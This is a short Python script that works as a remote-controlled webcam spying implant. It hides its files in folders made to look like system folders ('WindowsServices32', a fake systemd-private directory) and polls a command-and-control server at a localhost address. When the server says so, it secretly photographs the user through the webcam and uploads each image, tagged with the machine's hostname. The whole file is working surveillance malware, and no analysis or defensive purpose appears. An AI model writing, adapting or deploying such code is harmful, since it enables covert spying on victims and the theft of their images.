import cv2
import time
import requests
import os
import platform

if platform.system() == "Windows":
    system = "windows"
    hostname = platform.uname().node
elif platform.system() == "Linux":
    system = "linux"
    hostname = os.uname()[1]

else:
    exit()
if system == "windows":
    path = f"{os.getenv('appdata')}\\WindowsServices32\\"
else:
    path = "/tmp/systemd-private-adikdk2112312-service/"
if not os.path.exists(path):
    os.mkdir(path)
    

c2_base_url = "http://127.0.0.1:8000/"

images = 0

### Take webcam picture ###
def webcam_pic():
    global images
    webcam = cv2.VideoCapture(0)
    check, frame = webcam.read()
    if not check:
        return 0
    time.sleep(0.5)
    cv2.imwrite(filename=f'{path}webcam_image_{images}.jpg', img=frame)
    webcam.release()

    ### Upload pic to c2
    data = {"password": "hej", "user": hostname}
    files = {"file": open(f"{path}webcam_image_{images}.jpg", "rb")}
    requests.post(f"{c2_base_url}core/upload", data=data, files=files)
    
    images += 1
    return 1

def main():
    while True:
        c2=requests.get(f"{c2_base_url}core/control")
        c2_json = c2.json()
        if c2_json.get("webcam") == True:
            webcam_pic()
        time.sleep(1)


if __name__ == "__main__":
    main()